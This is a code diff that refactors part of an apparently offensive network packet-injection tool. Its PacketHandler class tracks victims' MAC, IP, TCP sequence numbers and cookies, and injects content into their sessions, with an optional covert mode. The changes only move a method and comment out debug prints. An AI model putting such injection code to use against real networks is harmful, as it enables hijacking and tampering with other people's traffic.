@@ -298,6 +298,26 @@ class PacketHandler(object):
         return injection
 
 
+    def condensor(self, vicmac, rtrmac, vicip, svrip, vicport, svrport, acknum, seqnum, request, cookie, TSVal, TSecr, args, injection, victim, procTimerStart):
+        """Condense some of the logic into a single function"""
+        #print 'condensed!'
+        #print dir(victim)
+        if victim.victim_parameters.covert:
+            #print 'covert'
+            cov_injection = self.covert_injection(vicmac, rtrmac, vicip, svrip, vicport, svrport, acknum, seqnum, request, cookie, injection)
+            if (cov_injection != 0):
+                injection = cov_injection
+            else:
+                return 0
+        #else:
+            #print 'not covert'
+
+        #print injection
+        procTimerEnd = time.time()
+        self.injector.inject(vicmac, rtrmac, vicip, svrip, vicport, svrport, acknum, seqnum, injection, TSVal, TSecr, args, procTimerStart, procTimerEnd)
+        #print 'sent'
+
+
     def proc_excluded(self, excluded):
         """Check if argument provided in excluded is an ip.
         
@@ -386,28 +406,9 @@ class PacketHandler(object):
                 TSecr = None
 
             cookie = self.cookieSearch(request)
-            #print (vicmac, rtrmac, vicip, svrip, vicport, svrport, acknum, seqnum, request, cookie, TSVal, TSecr)
+            #print (vicmac, rtrmac, vicip, svrip, vicport, svrport, acknum, seqnum, request, cookie, TSVal, TSecr, procTimerStart)
             return (vicmac, rtrmac, vicip, svrip, vicport, svrport, acknum, seqnum, request, cookie, TSVal, TSecr, procTimerStart)
         return None
-
-
-    def condensor(self, vicmac, rtrmac, vicip, svrip, vicport, svrport, acknum, seqnum, request, cookie, TSVal, TSecr, args, injection, victim, procTimerStart):
-        print 'condensed!'
-        #print dir(victim)
-        if victim.victim_parameters.covert:
-            print 'covert'
-            cov_injection = self.covert_injection(vicmac, rtrmac, vicip, svrip, vicport, svrport, acknum, seqnum, request, cookie, injection)
-            if (cov_injection != 0):
-                injection = cov_injection
-            else:
-                return 0
-        else:
-            print 'not covert'
-
-        #print injection
-        procTimerEnd = time.time()
-        self.injector.inject(vicmac, rtrmac, vicip, svrip, vicport, svrport, acknum, seqnum, injection, TSVal, TSecr, args, procTimerStart, procTimerEnd)
-        print 'sent'
 
 
     def proc_injection(self, vicmac, rtrmac, vicip, svrip, vicport, svrport, acknum, seqnum, request, cookie, TSVal, TSecr, args, procTimerStart):
@@ -429,7 +430,6 @@ class PacketHandler(object):
                 if (svrip in self.excluded):
                     return 0
 
-            ### Clean this nest
             for victim in self.newvictims:
                 if (victim.ip is not None):
                     if (victim.ip == vicip):
@@ -443,6 +443,7 @@ class PacketHandler(object):
                             injection = victim.get_injection()
                             if (injection is not None):
                                 self.condensor(vicmac, rtrmac, vicip, svrip, vicport, svrport, acknum, seqnum, request, cookie, TSVal, TSecr, args, injection, victim, procTimerStart)
+
         else:
             if (self.victim_parameters is not None):
                 if (self.victim_parameters.in_request is not None):
@@ -455,7 +456,6 @@ class PacketHandler(object):
                     if (svrip in self.excluded):
                         return 0
 
-                ### Clean this nest
                 for victim in self.newvictims:
                     if (victim.ip is not None):
                         if (victim.ip == vicip):
